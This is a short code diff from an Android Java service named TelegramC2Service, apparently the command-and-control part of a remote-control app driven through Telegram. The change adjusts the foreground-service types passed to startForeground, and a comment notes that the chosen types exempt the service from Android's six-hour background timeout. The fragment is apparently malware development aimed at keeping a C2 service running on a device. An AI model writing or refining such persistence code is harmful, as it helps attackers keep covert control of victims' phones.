@@ -27,7 +27,7 @@ public class TelegramC2Service extends Service {
             // Use  remoteMessaging for C2, specialUse for keepAlive; exempt from 6hr timeout (only dataSync/mediaProcessing limited)
             Notification notif = createNotification();
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(NOTIFICATION_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_REMOTE_MESSAGING | ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE | ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+                startForeground(NOTIFICATION_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_REMOTE_MESSAGING | ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
             } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForeground(NOTIFICATION_ID, notif);
             } else {
